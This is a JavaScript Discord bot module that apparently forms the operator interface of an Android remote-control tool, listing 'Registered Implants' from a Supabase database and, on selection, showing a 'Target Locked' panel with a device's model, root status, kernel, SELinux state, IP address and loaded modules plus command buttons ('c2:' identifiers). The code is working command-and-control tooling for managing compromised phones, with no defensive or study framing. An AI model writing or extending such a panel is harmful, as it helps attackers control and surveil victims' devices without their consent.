import { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } from 'discord.js'
import { deviceTable, deviceSelectMenu, randomGif } from './_utils.js'

export const name = 'devices'

export async function execute(message, _args, { supabase }) {
  const { data: devices } = await supabase
    .from('devices')
    .select('*')
    .order('last_seen', { ascending: false })
    .limit(25)

  const embed = new EmbedBuilder()
    .setColor(0x00f0ff)
    .setTitle('📡 Registered Implants')
    .setDescription(deviceTable(devices || []))
    .setTimestamp()

  const components = []

  const selectMenu = deviceSelectMenu(devices || [])
  if (selectMenu) components.push(selectMenu)

  const row2 = new ActionRowBuilder()
    .addComponents(
      new ButtonBuilder().setCustomId('c2:devices:refresh').setLabel('🔄 Refresh').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId('c2:menu:show').setLabel('🏠 Menu').setStyle(ButtonStyle.Secondary),
    )
  components.push(row2)

  await message.reply({ embeds: [embed], components })
}

export async function handleButton(interaction, args, { supabase }) {
  const action = args[0]

  if (action === 'refresh' || action === 'list') {
    const { data: devices } = await supabase
      .from('devices')
      .select('*')
      .order('last_seen', { ascending: false })
      .limit(25)

    const embed = new EmbedBuilder()
      .setColor(0x00f0ff)
      .setTitle('📡 Registered Implants')
      .setDescription(deviceTable(devices || []))
      .setTimestamp()

    const components = []
    const selectMenu = deviceSelectMenu(devices || [])
    if (selectMenu) components.push(selectMenu)

    const row2 = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder().setCustomId('c2:devices:refresh').setLabel('🔄 Refresh').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId('c2:menu:show').setLabel('🏠 Menu').setStyle(ButtonStyle.Secondary),
      )
    components.push(row2)

    await interaction.update({ embeds: [embed], components })
  }
}

export async function handleSelect(interaction, args, { supabase, setTarget, formatTime }) {
  const deviceId = interaction.values[0]

  const { data: dev } = await supabase
    .from('devices')
    .select('*')
    .eq('device_id', deviceId)
    .single()

  if (!dev) {
    return interaction.reply({ embeds: [new EmbedBuilder().setColor(0xff3355).setTitle('❌ Device Not Found').setTimestamp()], ephemeral: true })
  }

  setTarget(interaction.guildId, interaction.user.id, deviceId)

  const online = dev.last_seen && (Date.now() - new Date(dev.last_seen).getTime() < 300000)

  const embed = new EmbedBuilder()
    .setColor(online ? 0x00ff88 : 0xff3355)
    .setTitle(`🎯 Target Locked: ${(dev.device_id || '').slice(0, 20)}…`)
    .setImage(randomGif('target'))
    .addFields(
      { name: 'Model', value: dev.model || '?', inline: true },
      { name: 'Android', value: dev.android_ver || '?', inline: true },
      { name: 'Root', value: dev.root_status || '?', inline: true },
      { name: 'Status', value: online ? '🟢 ONLINE' : '🔴 OFFLINE', inline: true },
      { name: 'Last Seen', value: formatTime(dev.last_seen), inline: true },
      { name: 'Kernel', value: dev.kernel || '?', inline: true },
      { name: 'SELinux', value: dev.selinux || '?', inline: true },
      { name: 'IP', value: dev.ip || '?', inline: true },
      { name: 'Modules', value: (dev.modules?.length ? dev.modules.join(', ') : 'none') || 'none', inline: false },
    )
    .setFooter({ text: 'Use !cmd or the buttons below' })
    .setTimestamp()

  const { actionButtons } = await import('./_utils.js')
  await interaction.reply({ embeds: [embed], components: [actionButtons(deviceId)], ephemeral: false })
}
